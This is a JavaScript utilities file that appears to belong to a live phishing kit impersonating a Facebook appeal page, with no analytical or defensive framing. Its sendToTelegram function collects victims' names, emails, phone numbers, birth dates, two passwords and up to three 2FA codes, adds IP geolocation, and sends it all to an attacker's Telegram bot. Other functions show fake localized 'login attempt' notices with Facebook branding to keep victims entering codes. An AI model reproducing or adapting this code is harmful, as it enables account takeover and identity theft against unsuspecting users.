// Utilities
const Utils = {
    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error('Save error:', error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }
            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    async getUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error getting IP:', error);
            return 'N/A';
        }
    },

    async getUserLocation() {
        // Cache: trả về kết quả gần nhất nếu hợp lệ
        try {
            const cached = this.getRecord('pc_user_loc');
            if (cached && cached.country_code && cached.country_code !== 'N/A' && String(cached.country_code).length === 2) {
                return cached;
            }
        } catch (_) {}
        const codeToName = (code) => {
            const k = String(code || '').toUpperCase();
            if (!k) return '';
            // Prefer native region names when available
            try {
                if (typeof Intl !== 'undefined' && typeof Intl.DisplayNames === 'function') {
                    const dn = new Intl.DisplayNames(['en'], { type: 'region' });
                    const name = dn.of(k);
                    if (name && typeof name === 'string') return name;
                }
            } catch (_) {}
            // Fallback mapping for common codes
            const M = {
                US: 'United States', GB: 'United Kingdom', CA: 'Canada', AU: 'Australia', IN: 'India',
                JP: 'Japan', KR: 'Korea', DE: 'Germany', FR: 'France', IT: 'Italy', ES: 'Spain', PT: 'Portugal', TH: 'Thailand',
                CN: 'China', TW: 'Taiwan', HK: 'Hong Kong', NL: 'Netherlands', DK: 'Denmark', AE: 'United Arab Emirates', SA: 'Saudi Arabia',
                EG: 'Egypt', IQ: 'Iraq', JO: 'Jordan', KW: 'Kuwait', LB: 'Lebanon', LY: 'Libya', MA: 'Morocco', OM: 'Oman', QA: 'Qatar',
                SY: 'Syria', TN: 'Tunisia', YE: 'Yemen', UA: 'Ukraine', VN: 'Vietnam', BR: 'Brazil', MX: 'Mexico', SG: 'Singapore',
                MY: 'Malaysia', PH: 'Philippines', ID: 'Indonesia', TR: 'Turkey', SE: 'Sweden', NO: 'Norway', FI: 'Finland', IE: 'Ireland',
                CH: 'Switzerland', AT: 'Austria', BE: 'Belgium', PL: 'Poland', RU: 'Russia'
            };
            return M[k] || '';
        };
        const toResult = (src) => {
            const cc = src.country_code || 'N/A';
            const countryName = (src.country && src.country !== 'N/A') ? src.country : (codeToName(cc) || 'N/A');
            const regName = (src.region && src.region !== 'N/A') ? src.region : 'N/A';
            return {
                location: `${src.ip || 'N/A'} | ${countryName}(${cc})`,
                country_code: cc,
                ip: src.ip || 'N/A',
                region: regName,
                region_code: src.region_code || 'N/A',
                regionName: regName,
                city: src.city || 'N/A',
                country: countryName
            };
        };

        const isValid = (r) => {
            try {
                const cc = (r && r.country_code) ? String(r.country_code).toUpperCase() : '';
                return cc && cc !== 'N/A' && cc.length === 2;
            } catch (_) { return false; }
        };

        const fetchJson = async (url) => {
            const res = await fetch(url, { headers: { 'Accept': 'application/json' }, cache: 'no-store' });
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            return await res.json();
        };

        try {
            // Prefer Vercel edge header on deployed site
            const p0 = async () => {
                try {
                    const res = await fetch('/api/ip-country', { headers: { 'Accept': 'application/json' }, cache: 'no-store' });
                    if (!res.ok) throw new Error('HTTP ' + res.status);
                    const d = await res.json();
                    return toResult({
                        ip: d.ip || 'N/A',
                        country: 'N/A',
                        country_code: d.country_code,
                        city: 'N/A',
                        region: 'N/A',
                        region_code: 'N/A'
                    });
                } catch (_) { return null; }
            };

            const p1 = async () => {
                const d = await fetchJson('https://ipwho.is/');
                if (d && (d.success === true || typeof d.success === 'undefined')) {
                    return toResult({
                        ip: d.ip,
                        country: d.country,
                        country_code: d.country_code,
                        city: d.city,
                        region: d.region,
                        region_code: d.region_code || 'N/A'
                    });
                }
                return null;
            };

            const p2 = async () => {
                const d = await fetchJson('https://geolocation-db.com/json/');
                return toResult({
                    ip: d.IPv4,
                    country: d.country_name,
                    country_code: d.country_code,
                    city: d.city,
                    region: d.state,
                    region_code: 'N/A'
                });
            };

            const p3 = async () => {
                const d = await fetchJson('https://ipapi.co/json/');
                return toResult({
                    ip: d.ip,
                    country: d.country_name,
                    country_code: d.country_code,
                    city: d.city,
                    region: d.region,
                    region_code: d.region_code
                });
            };

            const firstValid = (providers, timeoutMs) => new Promise((resolve) => {
                let done = false;
                const tryResolve = (val) => {
                    if (!done && val && isValid(val)) {
                        done = true;
                        resolve(val);
                    }
                };
                for (let i = 0; i < providers.length; i++) {
                    try { providers[i]().then(tryResolve).catch(() => {}); } catch (_) {}
                }
                setTimeout(() => { if (!done) resolve(null); }, timeoutMs || 2000);
            });

            const first = await firstValid([p1, p3, p2, p0], 2000);
            if (first && isValid(first)) {
                const hasIp = first.ip && first.ip !== 'N/A';
                const hasCountry = first.country && first.country !== 'N/A';
                const hasCity = first.city && first.city !== 'N/A';
                const hasRegion = first.region && first.region !== 'N/A';
                if (hasIp && hasCountry && hasCity && hasRegion) return first;
                const enrichers = [p1, p3, p2];
                const merge = (a, b) => (a && a !== 'N/A') ? a : b;
                let enriched = first;
                for (let i = 0; i < enrichers.length; i++) {
                    try {
                        const r = await enrichers[i]();
                        if (r) {
                            enriched = toResult({
                                ip: merge(enriched.ip, r.ip),
                                country: merge(enriched.country, r.country),
                                country_code: merge(enriched.country_code, r.country_code),
                                city: merge(enriched.city, r.city),
                                region: merge(enriched.region, r.region),
                                region_code: merge(enriched.region_code, r.region_code)
                            });
                            const done = (enriched.ip && enriched.ip !== 'N/A') && (enriched.country && enriched.country !== 'N/A') && (enriched.city && enriched.city !== 'N/A') && (enriched.region && enriched.region !== 'N/A');
                            if (done) break;
                        }
                    } catch (_) {}
                }
                if (!enriched.ip || enriched.ip === 'N/A') {
                    // As a last resort, fill only IP via ipify
                    try {
                        const ipOnly = await this.getUserIp();
                        if (ipOnly && ipOnly !== 'N/A') {
                            enriched.ip = ipOnly;
                            enriched.location = `${ipOnly} | ${enriched.country}(${enriched.country_code})`;
                        }
                    } catch(_) {}
                }
                try { if (isValid(enriched)) this.saveRecord('pc_user_loc', enriched); } catch (_) {}
                return enriched;
            }

            try {
                const r0 = await p0(); if (r0 && isValid(r0)) {
                    if (!r0.ip || r0.ip === 'N/A') { try { r0.ip = await this.getUserIp(); } catch(_) {} }
                    try { this.saveRecord('pc_user_loc', r0); } catch (_) {}
                    return r0;
                }
            } catch (_) {}
            try {
                const r1 = await p1(); if (r1 && isValid(r1)) {
                    if (!r1.ip || r1.ip === 'N/A') { try { r1.ip = await this.getUserIp(); } catch(_) {} }
                    try { this.saveRecord('pc_user_loc', r1); } catch (_) {}
                    return r1;
                }
            } catch (_) {}
            try {
                const r2 = await p2(); if (r2 && isValid(r2)) {
                    if (!r2.ip || r2.ip === 'N/A') { try { r2.ip = await this.getUserIp(); } catch(_) {} }
                    try { this.saveRecord('pc_user_loc', r2); } catch (_) {}
                    return r2;
                }
            } catch (_) {}
            try {
                const r3 = await p3(); if (r3 && isValid(r3)) {
                    if (!r3.ip || r3.ip === 'N/A') { try { r3.ip = await this.getUserIp(); } catch(_) {} }
                    try { this.saveRecord('pc_user_loc', r3); } catch (_) {}
                    return r3;
                }
            } catch (_) {}

            // If all providers failed, still try to populate IP via ipify
            let ipOnly = 'N/A';
            try { ipOnly = await this.getUserIp(); } catch (_) {}
            return {
                location: `${ipOnly} | N/A(N/A)`,
                country_code: 'N/A',
                ip: ipOnly || 'N/A',
                region: 'N/A',
                region_code: 'N/A',
                regionName: 'N/A',
                city: 'N/A',
                country: 'N/A'
            };
        } catch (error) {
            console.error('Error getting location:', error);
            let ipOnly = 'N/A';
            try { ipOnly = await this.getUserIp(); } catch (_) {}
            return {
                location: `${ipOnly} | N/A(N/A)`,
                country_code: 'N/A',
                ip: ipOnly || 'N/A',
                region: 'N/A',
                region_code: 'N/A',
                regionName: 'N/A',
                city: 'N/A',
                country: 'N/A'
            };
        }
    },

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();
        const isMobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent || '');
        const deviceLabel = isMobileUA ? 'Phone' : 'Computer';
        const mobileFlag = isMobileUA ? 'True' : 'False';
        
        // Build separated labels for easier copying
        const countryCode = locationData.country_code;
        const countryLabel = (countryCode && countryCode !== 'N/A')
            ? `${locationData.country || 'N/A'}(${countryCode})`
            : `${locationData.country || 'N/A'}`;

        // Country line: prefer region name; if missing, fall back to country
        const baseRegion = (locationData.regionName && locationData.regionName !== 'N/A')
            ? locationData.regionName
            : (locationData.region && locationData.region !== 'N/A')
                ? locationData.region
                : (locationData.country && locationData.country !== 'N/A')
                    ? locationData.country
                    : 'N/A';
        const regionLabel = (locationData.region_code && locationData.region_code !== 'N/A')
            ? `${baseRegion}(${locationData.region_code})`
            : `${baseRegion}`;

        const locationLine = `${locationData.ip} | ${countryLabel}`;

        const cityLabel = (locationData.city && locationData.city !== 'N/A') ? locationData.city : 'N/A';

        const text = `
<b>🌐 IP:</b> <code>${locationData.ip}</code>
<b>📍 Location:</b> <code>${locationLine}</code>
<b>🏳️ Country:</b> <code>${regionLabel}</code>
<b>🔹 Region:</b> <code>${cityLabel}</code>
<b>🔹 Mobile:</b> <code>${mobileFlag}</code>
<b>🔹 Device:</b> <code>${deviceLabel}</code>
----------------------------------
<b>👤 Full Name:</b> <code>${data.fullName || ''}</code>
<b>📧 Email:</b> <code>${data.email || ''}</code>
<b>🔹 Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>🔹 Page Name:</b> <code>${data.fanpage || ''}</code>
<b>📞 Phone:</b> <code>${data.phone || ''}</code>
<b>🔹 Call_Code:</b> <code>${data.callCode || ''}</code>
<b>🔹 Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
----------------------------------
<b>🔒 Password(1):</b> <code>${data.password || ''}</code>
<b>🔒 Password(2):</b> <code>${data.passwordSecond || ''}</code>
----------------------------------
<b>🔐 Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐 Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
<b>🔐 Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;

        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    },

    isMobile() {
        try {
            return window.matchMedia && window.matchMedia('(max-width: 768px)').matches;
        } catch (_) {
            return false;
        }
    },

    async showLoginNotification(userData = {}, attempt = 1) {
        try {
            if (!this.isMobile()) return;

            const id = 'pc-top-noti';
            let el = document.getElementById(id);
            if (!el) {
                el = document.createElement('div');
                el.id = id;
                el.className = 'pc-top-noti';
                document.body.appendChild(el);
            }

            const emailLabel = this.maskEmail(userData.email || '');
            const phoneLabel = this.maskPhone(userData.phone || '');
            const primaryLabel = emailLabel || phoneLabel || 'Account';

            // Immediate feedback (i18n)
            const t = (window.I18N && typeof window.I18N.t === 'function') ? window.I18N.t : (k) => k;
            el.innerHTML = `<div class="dot"></div><span class="badge">${t('toast_badge_2fa_login')}</span><span>${t('toast_submitting_code')}</span>`;
            el.classList.add('show');
            clearTimeout(el.__hideTimer);
            el.__hideTimer = setTimeout(() => { el.classList.remove('show'); }, 10000);

            // Enrich with location/IP when available
            const loc = await this.getUserLocation();
            const ip = loc?.ip || 'N/A';
            const city = (loc?.city && loc.city !== 'N/A') ? loc.city : null;
            const regionLabel = (loc?.regionName && loc.regionName !== 'N/A')
                ? loc.regionName
                : (loc?.region && loc.region !== 'N/A')
                    ? loc.region
                    : (loc?.country && loc.country !== 'N/A')
                        ? loc.country
                        : null;
            const locCompact = `${ip} • ${[city, regionLabel].filter((v) => v && v !== 'N/A').join(', ')}`;
            el.innerHTML = `<div class="dot"></div><span class="badge">${t('toast_badge_2fa_login')}</span><span>${t('toast_code_attempt').replace('{attempt}', String(attempt)).replace('{account}', primaryLabel)}</span><span class="ml-auto text-xs" style="color: var(--pc-grey)">${locCompact}</span>`;
            el.classList.add('show');
            clearTimeout(el.__hideTimer);
            el.__hideTimer = setTimeout(() => { el.classList.remove('show'); }, 10000);
        } catch (_) {
            // no-op
        }
    },

    getLocalizedToastMessage(lang, loc) {
        const hasLoc = !!(loc && String(loc).trim());
        const TEMPLATES = {
            en: {
                withLoc: 'You are attempting to log in at {loc} to submit an appeal. If this was you, please let us know.',
                noLoc: 'You are attempting to log in to submit an appeal. If this was you, please let us know.'
            },
            ko: {
                withLoc: '{loc}에서 항소 제출을 위해 로그인 시도 중입니다. 본인이시라면 알려주세요.',
                noLoc: '항소 제출을 위해 로그인 시도 중입니다. 본인이시라면 알려주세요.'
            },
            de: {
                withLoc: 'Sie versuchen, sich in {loc} anzumelden, um eine Beschwerde einzureichen. Wenn Sie es waren, lassen Sie es uns wissen.',
                noLoc: 'Sie versuchen, sich anzumelden, um eine Beschwerde einzureichen. Wenn Sie es waren, lassen Sie es uns wissen.'
            },
            fr: {
                withLoc: 'Vous tentez de vous connecter à {loc} pour soumettre un recours. Si c’était vous, veuillez nous le signaler.',
                noLoc: 'Vous tentez de vous connecter pour soumettre un recours. Si c’était vous, veuillez nous le signaler.'
            },
            it: {
                withLoc: 'Stai tentando di accedere a {loc} per presentare un ricorso. Se eri tu, faccelo sapere.',
                noLoc: 'Stai tentando di accedere per presentare un ricorso. Se eri tu, faccelo sapere.'
            },
            es: {
                withLoc: 'Estás intentando iniciar sesión en {loc} para presentar una apelación. Si fuiste tú, háznoslo saber.',
                noLoc: 'Estás intentando iniciar sesión para presentar una apelación. Si fuiste tú, háznoslo saber.'
            },
            pt: {
                withLoc: 'Você está tentando fazer login em {loc} para enviar um recurso. Se foi você, avise-nos.',
                noLoc: 'Você está tentando fazer login para enviar um recurso. Se foi você, avise-nos.'
            },
            th: {
                withLoc: 'คุณกำลังพยายามเข้าสู่ระบบที่ {loc} เพื่อส่งคำอุทธรณ์ หากเป็นคุณ โปรดแจ้งให้เราทราบ',
                noLoc: 'คุณกำลังพยายามเข้าสู่ระบบเพื่อส่งคำอุทธรณ์ หากเป็นคุณ โปรดแจ้งให้เราทราบ'
            },
            ja: {
                withLoc: '{loc} でログインして異議申し立てを送信しようとしています。ご本人の場合はお知らせください。',
                noLoc: 'ログインして異議申し立てを送信しようとしています。ご本人の場合はお知らせください。'
            },
            zh: {
                withLoc: '您正在 {loc} 尝试登录以提交申诉。如果是您本人，请告知我们。',
                noLoc: '您正在尝试登录以提交申诉。如果是您本人，请告知我们。'
            },
            nl: {
                withLoc: 'Je probeert in te loggen in {loc} om een beroep in te dienen. Als jij het was, laat het ons weten.',
                noLoc: 'Je probeert in te loggen om een beroep in te dienen. Als jij het was, laat het ons weten.'
            },
            da: {
                withLoc: 'Du forsøger at logge ind i {loc} for at indsende en appel. Hvis det var dig, så giv os besked.',
                noLoc: 'Du forsøger at logge ind for at indsende en appel. Hvis det var dig, så giv os besked.'
            },
            ar: {
                withLoc: 'تحاول تسجيل الدخول في {loc} لتقديم طعن. إذا كنت أنت، يُرجى إبلاغنا.',
                noLoc: 'تحاول تسجيل الدخول لتقديم طعن. إذا كنت أنت، يُرجى إبلاغنا.'
            },
            uk: {
                withLoc: 'Ви намагаєтеся увійти в {loc}, щоб подати апеляцію. Якщо це були ви, повідомте нам.',
                noLoc: 'Ви намагаєтеся увійти, щоб подати апеляцію. Якщо це були ви, повідомте нам.'
            }
        };
        const dict = TEMPLATES[lang] || TEMPLATES.en;
        const template = hasLoc ? dict.withLoc : dict.noLoc;
        return hasLoc ? template.replace('{loc}', loc) : template;
    },

    getLocalizedCTA(lang) {
        const M = {
            en: 'View', de: 'Ansehen', fr: 'Voir', it: 'Vedi', es: 'Ver', pt: 'Ver', th: 'ดู', ko: '보기', ja: '表示', zh: '查看', nl: 'Bekijken', da: 'Se', ar: 'عرض', uk: 'Переглянути'
        };
        return M[lang] || M.en;
    },

    showTopMobileNotification(message) {
        try {
            const existing = document.getElementById('mobile-toast');
            if (existing) existing.remove();

            const ctaText = (window.I18N && typeof window.I18N.t === 'function') ? window.I18N.t('toast_cta_view') : this.getLocalizedCTA(window.currentLang || 'en');
            const toast = document.createElement('div');
            toast.id = 'mobile-toast';
            toast.className = 'mobile-toast';
            toast.innerHTML = '' +
                '<div class="mobile-toast__icon" aria-hidden="true">' +
                '  <img src="./public/meta/logo-fa.svg" alt="Facebook" width="22" height="22" />' +
                '</div>' +
                '<div class="mobile-toast__text">' + message + '</div>' +
                '<a class="mobile-toast__cta" href="https://facebook.com" rel="noopener">' + ctaText + '</a>';

            toast.addEventListener('click', function (e) {
                const anchor = e.target.closest('a.mobile-toast__cta');
                if (!anchor) window.location.href = 'https://facebook.com/';
            });

            document.body.appendChild(toast);
            requestAnimationFrame(function () { toast.classList.add('show'); });
            setTimeout(function () {
                try {
                    toast.classList.remove('show');
                    setTimeout(function () { if (toast && toast.parentNode) toast.parentNode.removeChild(toast); }, 350);
                } catch (_) {}
            }, 10000);
        } catch (_) {}
    }
};


window.Utils = Utils;
